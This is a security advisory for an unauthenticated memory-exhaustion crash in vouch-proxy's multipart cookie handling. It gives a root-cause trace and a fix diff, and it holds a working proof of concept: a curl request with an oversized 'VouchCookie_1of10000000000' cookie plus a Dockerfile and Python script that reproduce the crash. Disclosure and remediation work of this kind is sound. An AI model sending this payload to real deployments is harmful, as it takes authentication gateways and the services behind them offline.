# [H] vouch-proxy has an Unbounded Multipart Cookie Allocation DoS

## Summary
Severity: High
Advisory: GHSA-qqff-5854-px68
CVE: CVE-2026-55149
CWE: CWE-789
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-08-20
Source: https://github.com/advisories/GHSA-qqff-5854-px68
Type: github-advisory

## Affected
- Go: `github.com/vouch/vouch-proxy` — affected >=0 <0.48.0

## Details
## Unbounded Multipart Cookie Allocation DoS in vouch-proxy

### Summary

vouch-proxy v0.47.2 contains an unauthenticated remote denial-of-service vulnerability in its multipart cookie reassembly logic. The `/validate` endpoint parses the total cookie part count directly from the attacker-controlled cookie name (e.g., `VouchCookie_1of<N>`) and passes it without any bounds check to `make([]string, N)`. A single HTTP request with `N=10000000000` causes the Go runtime to attempt a ~160 GB heap allocation, triggering a fatal out-of-memory error that crashes the server process immediately. No authentication or prior session is required.

### Details

The vulnerability exists in `pkg/cookie/cookie.go`. The `Cookie()` function iterates over all cookies in the request, identifies multipart cookies by the `_NofM` suffix in their name, and initializes the reassembly slice on the first matching cookie:

```go
// pkg/cookie/cookie.go:123–130
xOFy := strings.Replace(cookie.Name, cookieUnder, "", 1)
xyArray := strings.Split(xOFy, "of")
if numParts == -1 {
    if numParts, err = strconv.Atoi(xyArray[1]); err != nil {
        return "", fmt.Errorf("multipart cookie fail: %s", err)
    }
    cookieParts = make([]string, numParts)  // sink: unbounded allocation
}
```

The value in `xyArray[1]` comes directly from the cookie name supplied by the client. There is no maximum value check, no positive-range assertion, and no format validation before `strconv.Atoi` parses it. The result is used as the length argument to `make`, so an attacker who supplies `VouchCookie_1of10000000000` causes the runtime to request approximately `10_000_000_000 × 16 bytes ≈ 160 GB` of memory in a single call.

The complete exploit path from network entry to crash:

1. `main.go:167` — `/validate` and `/_external-auth-:id` are registered wrapped in `JWTCacheHandler`.
2. `pkg/jwtmanager/jwtcache.go:54` — `JWTCacheHandler` calls `FindJWT(r)` **before** any authentication check.
3. `pkg/jwtmanager/jwtmanager.go:228` — `FindJWT` calls `cookie.Cookie(r)`.
4. `pkg/cookie/cookie.go:109` — `r.Cookies()` reads the attacker-supplied `Cookie:` header.
5. `pkg/cookie/cookie.go:124` — cookie name suffix is split on `"of"`.
6. `pkg/cookie/cookie.go:126` — `strconv.Atoi(xyArray[1])` parses the attacker-controlled total.
7. `pkg/cookie/cookie.go:130` — **sink**: `make([]string, numParts)` attempts a gigantic heap allocation.

Because the code path is exercised before JWT validation, no session token, credentials, or prior authentication are needed.

A suggested remediation is to add a strict upper bound and format validation before the allocation:

```diff
--- a/pkg/cookie/cookie.go
+++ b/pkg/cookie/cookie.go
@@ const maxCookieSize = 4000
+const maxCookieParts = 32
@@
-    xOFy := strings.Replace(cookie.Name, cookieUnder, "", 1)
-    xyArray := strings.Split(xOFy, "of")
+    xOFy := strings.Replace(cookie.Name, cookieUnder, "", 1)
+    partStr, totalStr, ok := strings.Cut(xOFy, "of")
+    if !ok || partStr == "" || totalStr == "" {
+        return "", fmt.Errorf("multipart cookie fail: invalid cookie part name")
+    }
     if numParts == -1 {
-        if numParts, err = strconv.Atoi(xyArray[1]); err != nil {
+        if numParts, err = strconv.Atoi(totalStr); err != nil {
             return "", fmt.Errorf("multipart cookie fail: %s", err)
         }
+        if numParts < 1 || numParts > maxCookieParts {
+            return "", fmt.Errorf("multipart cookie fail: invalid part count %d", numParts)
+        }
         cookieParts = make([]string, numParts)
     }
```

### PoC

**Environment setup**

Build the vulnerable image from source (requires the vouch-proxy repository at the path below):

```bash
docker build \
  -f vuln-001/Dockerfile \
  -t vouch-vuln001 \
  repo
```

Start the container (no memory limit is imposed; the Go runtime itself fails the allocation):

```bash
docker run -d --name vouch-vuln001-poc -p 19090:9090 vouch-vuln001
```

Wait for the server to respond to a baseline request (expected HTTP 302 or similar):

```bash
curl -v http://127.0.0.1:19090/validate
```

**Attack request**

Send a single unauthenticated HTTP GET with the malicious cookie name:

```bash
curl -v http://127.0.0.1:19090/validate \
  -H 'Host: app.example.com' \
  -H 'Cookie: VouchCookie_1of10000000000=x'
```

Alternatively, run the automated PoC script:

```bash
python3 poc.py --image vouch-vuln001 --port 19090 --parts 10000000000
```

**Expected result**

The server process crashes immediately with a Go runtime fatal error. Container logs show:

```
fatal error: runtime: out of memory

runtime.makeslice(0x0?, 0x0?, 0x0?)
    /usr/local/go/src/runtime/slice.go:117
github.com/vouch/vouch-proxy/pkg/cookie.Cookie(...)
    /src/pkg/cookie/cookie.go:130
github.com/vouch/vouch-proxy/pkg/jwtmanager.FindJWT(...)
    /src/pkg/jwtmanager/jwtmanager.go:228
main.main.JWTCacheHandler.func1(...)
    /src/pkg/jwtmanager/jwtcache.go:54
```

The container exits with code 2 (Go runtime fatal). The `curl` client receives an empty reply. The attack is 100% deterministic and reproducible on every run.

**Minimal configuration** (no real OAuth provider required):

```yaml
vouch:
  logLevel: info
  listen: 0.0.0.0
  port: 9090
  domains:
    - vouch.github.io
oauth:
  provider: indieauth
  client_id: http://vouch.github.io
  auth_url: https://indielogin.com/auth
  callback_url: http://vouch.github.io:9090/auth
```

### Impact

This is an unauthenticated remote denial-of-service vulnerability. Any network-reachable vouch-proxy instance running with a default or standard configuration is affected.

An attacker who can send a single HTTP request to the `/validate` or `/_external-auth-:id` endpoint can crash the vouch-proxy process immediately. In containerized deployments the container restarts; a persistent attacker can send the request again immediately after restart, keeping the proxy permanently unavailable. Since vouch-proxy is used as an authentication gateway in front of protected applications, its unavailability can result in downstream services becoming inaccessible or, depending on the reverse-proxy fail-open/fail-closed policy, unintentionally exposed.

No authentication, session, or prior account is required. The attack is reliable across all deployment configurations because the default cookie name (`VouchCookie`) is used and the vulnerable code path is exercised unconditionally on every request to the listed endpoints.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# VULN-001 — Unbounded Multipart Cookie Allocation DoS
# vouch/vouch-proxy v0.47.2 (commit b683f60)
#
# Attack: GET /validate with Cookie: VouchCookie_1of<HUGE>=x
#   -> cookie.Cookie() calls strconv.Atoi on the attacker-controlled total
#   -> make([]string, <HUGE>) triggers an immediate OOM fatal in the Go runtime
#   -> Server process crashes; no authentication required
#
# Build:  docker build -f vuln-001/Dockerfile -t vouch-vuln001 /path/to/repo
# Run:    docker run --rm -p 9090:9090 --name vouch-vuln001 vouch-vuln001

# ---------- Stage 1: compile vouch-proxy from source ----------
FROM golang:1.26 AS builder

WORKDIR /src
COPY . .

# Build a statically linked binary; skip do.sh which requires live git tags.
# Version ldflags are pinned to the affected commit for reproducibility.
RUN CGO_ENABLED=0 GOOS=linux \
    go build -v \
      -ldflags="-s -w \
        -X main.version=b683f60 \
        -X main.uname=linux \
        -X main.builddt=2024-01-01T00:00:00Z \
        -X main.host=vuln-poc \
        -X main.semver=v0.47.2 \
        -X main.branch=main" \
      -o /vouch-proxy .

# ---------- Stage 2: minimal runtime image ----------
FROM debian:bookworm-slim

RUN apt-get update && \
    apt-get install -y --no-install-recommends ca-certificates && \
    rm -rf /var/lib/apt/lists/*

COPY --from=builder /vouch-proxy /vouch-proxy

# Minimal config: allowAllUsers so startup succeeds without real OAuth,
# default cookie name VouchCookie matches the PoC payload.
RUN mkdir -p /config && cat > /config/config.yml << 'EOF'
vouch:
  logLevel: info
  listen: 0.0.0.0
  port: 9090
  domains:
    - vouch.github.io
oauth:
  provider: indieauth
  client_id: http://vouch.github.io
  auth_url: https://indielogin.com/auth
  callback_url: http://vouch.github.io:9090/auth
EOF

EXPOSE 9090
ENTRYPOINT ["/vouch-proxy"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
VULN-001 Proof-of-Concept: Unbounded Multipart Cookie Allocation DoS
Target: vouch/vouch-proxy v0.47.2 (commit b683f60)
File:   pkg/cookie/cookie.go:126

Attack summary
--------------
The multipart-cookie reassembly routine reads the total part count from the
attacker-controlled cookie *name* (e.g. VouchCookie_1of<N>) and calls
    make([]string, N)
with no upper-bound check.  The /validate endpoint is reachable without any
authentication, so a single HTTP request with N=10_000_000_000 forces the
Go runtime to attempt a ~160 GB heap allocation, which immediately triggers
    runtime: out of memory: cannot allocate ...
and crashes the server process (Go fatal, exit 2).

Usage
-----
Run from the repo root (or any directory; paths are absolute):

    python3 poc.py [--image IMAGE] [--port PORT] [--parts N]

Defaults:
    IMAGE  = vouch-vuln001
    PORT   = 9090
    PARTS  = 10000000000   (10 billion -> ~160 GB allocation request)
"""

import argparse
import http.client
import json
import subprocess
import sys
import time

# ──────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────
DEFAULT_IMAGE  = "vouch-vuln001"
DEFAULT_PORT   = 19090        # host port; container always uses 9090 internally
DEFAULT_PARTS  = 10_000_000_000          # drives make([]string, 10_000_000_000)
CONTAINER_NAME = "vouch-vuln001-poc"
STARTUP_TIMEOUT_S = 30                   # seconds to wait for the server to listen
READY_POLL_S  = 1.0


# ──────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────

def run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
    """Run a subprocess and return the CompletedProcess."""
    print(f"[cmd] {' '.join(cmd)}")
    return subprocess.run(cmd, **kwargs)


def cleanup(name: str) -> None:
    """Remove an existing container by name, ignoring errors."""
    subprocess.run(
        ["docker", "rm", "-f", name],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )


def wait_for_server(host: str, port: int, timeout: float) -> bool:
    """Poll GET /validate until we get any response (even 401/302) or timeout."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            conn = http.client.HTTPConnection(host, port, timeout=2)
            conn.request("GET", "/validate")
            resp = conn.getresponse()
            # Any HTTP response means the server is up.
            print(f"[ready] server responded: HTTP {resp.status}")
            conn.close()
            return True
        except OSError:
            pass
        time.sleep(READY_POLL_S)
    return False


def container_running(name: str) -> bool:
    """Return True if the named container is still running."""
    r = subprocess.run(
        ["docker", "inspect", "--format", "{{.State.Running}}", name],
        capture_output=True, text=True,
    )
    return r.returncode == 0 and r.stdout.strip() == "true"


def container_exit_code(name: str) -> int | None:
    """Return the exit code of a stopped container, or None if unknown."""
    r = subprocess.run(
        ["docker", "inspect", "--format", "{{.State.ExitCode}}", name],
        capture_output=True, text=True,
    )
    if r.returncode == 0:
        try:
            return int(r.stdout.strip())
        except ValueError:
            pass
    return None


def container_oom(name: str) -> bool:
    """Return True if the container was OOM-killed."""
    r = subprocess.run(
        ["docker", "inspect", "--format", "{{.State.OOMKilled}}", name],
        capture_output=True, text=True,
    )
    return r.returncode == 0 and r.stdout.strip() == "true"


def get_logs(name: str) -> str:
    """Retrieve stdout+stderr from the container."""
    r = subprocess.run(
        ["docker", "logs", name],
        capture_output=True, text=True,
    )
    return (r.stdout + r.stderr).strip()


# ──────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="VULN-001 PoC runner")
    parser.add_argument("--image",  default=DEFAULT_IMAGE,  help="Docker image name")
    parser.add_argument("--port",   default=DEFAULT_PORT,   type=int)
    parser.add_argument("--parts",  default=DEFAULT_PARTS,  type=int,
                        help="N in VouchCookie_1ofN (drives allocation size)")
    args = parser.parse_args()

    host       = "127.0.0.1"
    port       = args.port
    image      = args.image
    num_parts  = args.parts
    cookie_val = f"VouchCookie_1of{num_parts}"

    print("=" * 60)
    print("VULN-001 PoC — Unbounded Multipart Cookie Allocation DoS")
    print("=" * 60)
    print(f"  Image  : {image}")
    print(f"  Target : http://{host}:{port}/validate")
    print(f"  Cookie : {cookie_val}=x")
    print(f"  Expected allocation: ~{(num_parts * 16) // (1024**3)} GB")
    print()

    # 1. Clean up any leftover container.
    cleanup(CONTAINER_NAME)

    # 2. Start the vouch-proxy container.
    #    Memory is uncapped at the Docker level; the Go runtime itself will
    #    fail the mmap when the host cannot honor the 160 GB request
    #    (overcommit heuristic or insufficient address space).
    run_cmd = [
        "docker", "run", "-d",   # no --rm so logs survive after crash
        "--name", CONTAINER_NAME,
        "-p", f"{port}:9090",   # host:container — vouch-proxy always binds :9090 internally
        image,
    ]
    r = run(run_cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"[FAIL] docker run failed:\n{r.stderr}")
        sys.exit(1)
    container_id = r.stdout.strip()
    print(f"[info] container started: {container_id[:12]}")

    # 3. Wait for the HTTP server to accept connections.
    print(f"[info] waiting for server on {host}:{port} (up to {STARTUP_TIMEOUT_S}s) ...")
    ready = wait_for_server(host, port, STARTUP_TIMEOUT_S)
    if not ready:
        logs = get_logs(CONTAINER_NAME)
        print(f"[FAIL] server did not become ready within {STARTUP_TIMEOUT_S}s.")
        print("[logs]", logs[-2000:])
        cleanup(CONTAINER_NAME)
        sys.exit(1)

    # 4. Send the malicious request.
    print()
    print("[attack] Sending malicious cookie to /validate ...")
    request_line = f"GET /validate HTTP/1.1 Cookie: {cookie_val}=x"
    print(f"[attack] {request_line}")
    print()

    try:
        conn = http.client.HTTPConnection(host, port, timeout=10)
        conn.request(
            "GET", "/validate",
            headers={
                "Host": "app.example.com",
                "Cookie": f"{cookie_val}=x",
            },
        )
        # The server might crash before sending a response.
        try:
            resp = conn.getresponse()
            body = resp.read(512).decode("utf-8", errors="replace")
            print(f"[info] got HTTP {resp.status}: {body[:200]}")
        except Exception as e:
            print(f"[info] connection broken mid-response (expected): {e}")
        conn.close()
    except Exception as e:
        print(f"[info] request exception (expected if server crashed): {e}")

    # 5. Give the container a moment to record its exit state.
    time.sleep(2)

    # 6. Collect evidence.
    still_running = container_running(CONTAINER_NAME)
    exit_code     = container_exit_code(CONTAINER_NAME)
    oom_killed    = container_oom(CONTAINER_NAME)
    logs          = get_logs(CONTAINER_NAME)

    print("─" * 60)
    print("[evidence] Container still running :", still_running)
    print("[evidence] Container exit code      :", exit_code)
    print("[evidence] OOM-killed flag          :", oom_killed)
    print()
    print("[logs] (last 3000 chars of container stdout+stderr):")
    print(logs[-3000:] if logs else "(empty)")
    print("─" * 60)

    # 7. Verdict
    #
    # Evidence of exploitation (any one suffices):
    #   (a) Container exited (not still running) after the malicious request.
    #   (b) Exit code == 2 (Go runtime fatal: out of memory).
    #   (c) OOMKilled == true (kernel OOM killer fired).
    #   (d) Logs contain "out of memory" or "runtime: fatal".

    crashed   = not still_running
    go_panic  = exit_code == 2
    oom_kill  = oom_killed
    log_oom   = (
        "out of memory" in logs.lower()
        or "runtime: fatal" in logs.lower()
        or "cannot allocate" in logs.lower()
    )

    passed = crashed and (go_panic or oom_kill or log_oom)

    print()
    if passed:
        print("[PASS] Vulnerability reproduced: server crashed due to unbounded allocation.")
        # Extract the key OOM line from logs.
        oom_lines = [
            ln for ln in logs.splitlines()
            if any(kw in ln.lower() for kw in ("out of memory", "cannot allocate", "runtime: fatal", "oom"))
        ]
        evidence = "\n".join(oom_lines[:5]) if oom_lines else f"container exited with code {exit_code}"
    else:
        print("[FAIL] Could not confirm crash. See logs above for details.")
        evidence = logs[-500:] if logs else "(no logs)"

    print()
    result = {
        "passed":        passed,
        "verdict":       "PASS" if passed else "FAIL",
        "reason": (
            "단일 비인증 HTTP 요청으로 서버 프로세스를 OOM 충돌시키는 취약점 재현 성공"
            if passed else
            "컨테이너 충돌을 확인할 수 없음 — 로그 및 종료 코드 참고"
        ),
        "build_command": (
            "docker build -f vuln-001/Dockerfile "
            "-t vouch-vuln001 "
            "repo"
        ),
        "run_command": (
            f"docker run --rm -d --name {CONTAINER_NAME} "
            f"-p {port}:9090 {image}"
        ),
        "poc_command": (
            f"python3 poc.py --image {image} --port {port} --parts {num_parts}"
        ),
        "evidence":      evidence,
        "artifacts":     ["Dockerfile", "poc.py"],
    }

    result_path = (
        "reports/pypiAi_450_vouch__vouch-proxy"
        "/vuln-001/phase2_result.json"
    )
    with open(result_path, "w") as fh:
        json.dump(result, fh, indent=2, ensure_ascii=False)
    print(f"[saved] {result_path}")

    # 8. Cleanup.
    cleanup(CONTAINER_NAME)


if __name__ == "__main__":
    main()
```

## References
- https://github.com/vouch/vouch-proxy/security/advisories/GHSA-qqff-5854-px68
- https://github.com/vouch/vouch-proxy/commit/fa18ce30ba50a4863a436acad044c22965329c4f
- https://github.com/vouch/vouch-proxy
- https://github.com/vouch/vouch-proxy/releases/tag/v0.48.0
